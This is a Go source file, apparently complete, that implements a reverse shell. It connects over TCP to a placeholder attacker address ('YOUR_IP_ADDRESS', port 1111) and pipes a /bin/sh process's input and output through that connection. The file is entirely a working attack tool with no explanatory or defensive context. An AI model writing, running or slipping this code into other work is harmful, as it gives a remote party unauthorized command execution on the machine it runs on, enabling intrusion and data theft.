package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func main() {
	ip := "YOUR_IP_ADDRESS"
	port := "1111"

	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		fmt.Println("Error connecting to the remote host:", err)
		return
	}

	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	err = cmd.Run()
	if err != nil {
		fmt.Println("Error executing the command:", err)
	}

	conn.Close()
}